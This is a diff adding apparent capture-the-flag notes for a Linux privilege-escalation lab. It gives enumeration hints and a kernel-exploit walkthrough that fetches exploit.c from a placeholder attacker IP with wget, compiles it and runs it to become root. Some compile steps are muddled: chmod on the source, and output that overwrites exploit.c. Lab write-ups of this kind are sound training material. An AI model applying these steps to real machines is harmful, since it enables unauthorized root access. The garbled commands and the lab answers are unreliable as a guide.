@@ -1,0 +1,33 @@
+Linux PrivEsc - Task 3 {Enumeration}
+
+Question 1: What is the hostname of the target system?
+{{Hint: hostname // using sudo -l also worked}}
+
+Question 2: What is the Linux kernel version of the target system?
+{{Hint: uname -a}}
+
+Question 3: What Linux is this?
+{{Hint: cat /etc/issue}}
+
+Question 4: What version of Python is installed on the system?
+{{Hint: python --version}}
+
+Question 5: What vulnerability seems to affect the kernel of the target system? (Enter a CVE number)
+{{Hint: Search on Exploit-DB, the one in question has something to do with overlayfs...}}
+
+
+
+Task 5 {Privilege Escalation - Kernel Exploits}
+
+Question 1: What is the content of the flag1.txt file?
+{{First, identify the kernel version using uname -a.
+Search for an appropriate exploit (I used the same one in the last task), and download it.
+Start an http server (python3 -m http.server [portnumber] will work)
+On the victim machine navigate to the /tmp/ folder
+Use wget http://[Your Machine IP:port]/exploit.c
+chmod +x exploit.c
+Compile it using gcc exploit.c -o exploit.c
+run ./exploit.c
+
+If done correctly, you should now be root.
+flag1.txt is located in /home/matt/
